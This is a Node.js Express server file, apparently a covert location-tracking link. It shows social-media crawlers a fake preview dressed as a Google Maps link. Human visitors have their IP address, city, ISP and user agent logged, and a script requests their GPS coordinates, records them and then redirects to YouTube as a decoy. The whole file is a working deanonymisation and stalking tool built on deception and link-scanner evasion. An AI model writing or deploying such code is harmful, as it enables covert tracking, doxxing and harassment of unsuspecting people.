// language: JavaScript, runtime: Node 18+, file: server.js
const express = require('express');
const fs = require('fs');
const app = express();
const PORT = 3000;
const DECOY = 'https://www.youtube.com';
const LOG = 'hits.log';

async function log(req, extra = '') {
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
  const ua = req.headers['user-agent'] || '';
  const ts = new Date().toISOString();
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
    const geo = await geoRes.json();
    const line = `[${ts}] IP=${ip} City=${geo.city} Region=${geo.regionName} ISP=${geo.isp}${extra} UA=${ua}\n`;
    fs.appendFileSync(LOG, line);
    console.log(line.trim());
  } catch {
    const line = `[${ts}] IP=${ip}${extra} UA=${ua}\n`;
    fs.appendFileSync(LOG, line);
    console.log(line.trim());
  }
}

app.get('/loc', (req, res) => {
  const { lat, lon, acc } = req.query;
  const ts = new Date().toISOString();
  const line = `[${ts}] GPS LAT=${lat} LON=${lon} ACC=${acc}m\n`;
  fs.appendFileSync(LOG, line);
  console.log(line.trim());
  res.sendStatus(200);
});

app.get('/v/:id', async (req, res) => {
  const ua = req.headers['user-agent'] || '';
  const isCrawler = /facebookexternalhit|Twitterbot|LinkedInBot|WhatsApp|Slackbot|TelegramBot|curl|python/i.test(ua);

  if (isCrawler) {
    res.send(`<!DOCTYPE html>
<html>
<head>
  <meta property="og:title" content="https://maps.google.com/" />
  <meta property="og:description" content="view" />
  <meta property="og:image" content="https://i.imgur.com/XXXXXXX.jpg" />
  <meta property="og:url" content="https://${req.hostname}/v/${req.params.id}" />
  <meta property="og:type" content="website" />
  <meta name="twitter:card" content="summary_large_image" />
</head>
<body></body>
</html>`);
  } else {
    await log(req);
    res.send(`<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width"></head>
<body>
<script>
if(navigator.geolocation){
  navigator.geolocation.getCurrentPosition(function(p){
    fetch('/loc?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&acc='+p.coords.accuracy)
      .then(()=>{ window.location='${DECOY}'; });
  }, function(){ window.location='${DECOY}'; }, {timeout:5000});
} else { window.location='${DECOY}'; }
</script>
</body>
</html>`);
  }
});

app.listen(PORT, () => console.log(`running on :${PORT}`));
